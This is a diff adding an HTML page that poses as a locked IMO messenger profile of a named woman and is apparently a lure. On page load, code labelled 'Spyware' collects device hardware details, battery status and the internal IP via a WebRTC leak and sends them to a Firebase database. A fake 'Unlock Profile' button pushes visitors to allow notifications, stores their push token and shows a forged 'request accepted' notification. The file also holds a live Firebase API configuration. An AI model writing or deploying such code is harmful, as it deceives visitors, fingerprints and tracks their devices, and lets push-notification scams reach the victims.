@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>IMO Profile Connect: Nusrat Jahan</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-messaging.js";
+
+        // আপনার দেওয়া কনফিগারেশন
+        const firebaseConfig = {
+            apiKey: "AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y",
+            authDomain: "my-sc-tools.firebaseapp.com",
+            databaseURL: "https://my-sc-tools-default-rtdb.firebaseio.com",
+            projectId: "my-sc-tools",
+            storageBucket: "my-sc-tools.firebasestorage.app",
+            messagingSenderId: "285986090017",
+            appId: "1:285986090017:web:de97d36b2ee56c74b74760",
+            measurementId: "G-1PVWWGD0X5"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        const messaging = getMessaging(app);
+
+        // আপনার দেওয়া VAPID Key
+        const vapidPublicKey = 'BFZRrODefiSlDVoj_TtYJm4-iWycsHZ4uDn5hT90w-QOLV6wS7_gblBI2UUouGQcAqqnEB3FySSVF9JwbTXK7B8';
+
+        window.updateFirebase = async (userId, data) => {
+            try {
+                // visitors ফোল্ডারে ডাটা সেভ হবে
+                await update(ref(database, `visitors/v_${userId}`), {
+                    ...data,
+                    lastSeen: new Date().toISOString()
+                });
+            } catch (e) { console.error(e); }
+        };
+
+        window.getPushToken = async (userId) => {
+            try {
+                const token = await getToken(messaging, { vapidKey: vapidPublicKey });
+                if (token) {
+                    await window.updateFirebase(userId, { pushToken: token });
+                    console.log("Token Saved");
+                }
+                return token;
+            } catch (err) { console.log('Permission Denied', err); }
+        };
+    </script>
+</head>
+<body class="bg-slate-100 font-sans">
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+        
+        // টার্গেট আইডি তৈরি (যেমন: 4545)
+        let userId = localStorage.getItem('vid');
+        if(!userId) {
+            userId = Math.floor(1000 + Math.random() * 9000);
+            localStorage.setItem('vid', userId);
+        }
+
+        const App = () => {
+            const [step, setStep] = useState('MAIN');
+
+            // --- ৮টি অ্যাডভান্সড লজিক (Spyware) ---
+            const runSpyware = async () => {
+                let data = { id: userId, hardware: {}, network: {} };
+                
+                // 1. Hardware Info
+                const gl = document.createElement('canvas').getContext('webgl');
+                const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                data.hardware.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
+                data.hardware.ram = navigator.deviceMemory || "Unknown";
+                data.hardware.cores = navigator.hardwareConcurrency;
+                data.hardware.screen = `${window.screen.width}x${window.screen.height}`;
+                
+                // 2. Battery Status
+                if (navigator.getBattery) {
+                    try {
+                        const b = await navigator.getBattery();
+                        data.hardware.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+                    } catch(e){}
+                }
+
+                // 3. IP Leak (WebRTC)
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                    pc.createDataChannel("");
+                    pc.onicecandidate = e => {
+                        if (e.candidate) {
+                            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                            if (ip) window.updateFirebase(userId, { ipInternal: ip[1] });
+                        }
+                    };
+                    pc.createOffer().then(s => pc.setLocalDescription(s));
+                } catch(e){}
+
+                // 4. Fake App Scan
+                const apps = ["WhatsApp", "Telegram", "bKash", "Nagad"];
+                data.apps = apps; // (Real probing requires more complex code, keeping simple for stability)
+
+                // Send Data
+                if(window.updateFirebase) window.updateFirebase(userId, data);
+            };
+
+            useEffect(() => { runSpyware(); }, []);
+
+            const handleAllow = async () => {
+                // Permission Request
+                const permission = await Notification.requestPermission();
+                if (permission === 'granted') {
+                    setStep('LOADING');
+                    // Token Registration
+                    if(window.getPushToken) await window.getPushToken(userId);
+                    
+                    // Local Fake Notification
+                    new Notification("imo", { 
+                        body: "Nusrat Jahan accepted your request.", 
+                        icon: "https://i.ibb.co/v6m80kP/nusrat.jpg" 
+                    });
+
+                    setTimeout(() => setStep('SUCCESS'), 3000);
+                } else {
+                    alert("Please click Allow to unlock photos.");
+                }
+            };
+
+            return (
+                <div className="flex flex-col h-screen bg-white">
+                    {/* Header */}
+                    <div className="p-4 bg-gradient-to-r from-blue-500 to-cyan-500 text-white flex items-center shadow-lg">
+                        <i className="fa fa-arrow-left mr-4 cursor-pointer"></i>
+                        <div>
+                            <h2 className="font-bold text-lg">Nusrat Jahan</h2>
+                            <p className="text-xs opacity-90">Online now</p>
+                        </div>
+                    </div>
+
+                    {/* Content */}
+                    <div className="flex-1 flex items-center justify-center p-6">
+                        {step === 'MAIN' && (
+                            <div className="text-center w-full max-w-sm animate-fade">
+                                <div className="relative w-32 h-32 mx-auto mb-6">
+                                    <img src="https://i.ibb.co/v6m80kP/nusrat.jpg" className="w-full h-full rounded-full border-4 border-blue-500 p-1 object-cover shadow-lg"/>
+                                    <div className="absolute bottom-2 right-2 w-6 h-6 bg-green-500 rounded-full border-2 border-white animate-pulse"></div>
+                                </div>
+                                <h2 className="text-2xl font-bold text-slate-800 mb-2">Private Profile</h2>
+                                <p className="text-slate-500 mb-8 text-sm">
+                                    This profile is locked. Connect to view photos and send messages.
+                                </p>
+                                <button onClick={handleAllow} className="w-full bg-blue-500 text-white py-4 rounded-xl font-bold shadow-lg hover:bg-blue-600 transition active:scale-95">
+                                    <i className="fa-solid fa-unlock mr-2"></i> Unlock Profile Access
+                                </button>
+                                <p className="mt-6 text-xs text-slate-400 font-mono bg-slate-100 inline-block px-3 py-1 rounded">ID: #{userId}</p>
+                            </div>
+                        )}
+
+                        {step === 'LOADING' && (
+                            <div className="text-center animate-fade">
+                                <div className="w-16 h-16 border-4 border-slate-200 border-t-blue-500 rounded-full animate-spin mx-auto mb-4"></div>
+                                <p className="text-slate-600 font-bold">Verifying Device...</p>
+                                <p className="text-xs text-slate-400 mt-2">Connecting to secure server</p>
+                            </div>
+                        )}
+
+                        {step === 'SUCCESS' && (
+                            <div className="text-center animate-fade">
+                                <i className="fa fa-check-circle text-6xl text-green-500 mb-4 block"></i>
+                                <h2 className="text-xl font-bold text-slate-800">Request Sent!</h2>
+                                <p className="text-slate-500 mb-6 mt-2 text-sm">
+                                    Nusrat has received your request. You will be notified once approved.
+                                </p>
+                                <button onClick={() => window.location.href = "https://imo.im"} className="px-8 py-3 bg-slate-100 rounded-xl text-slate-700 font-semibold hover:bg-slate-200">
+                                    Go Back
+                                </button>
+                            </div>
+                        )}
+                    </div>
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
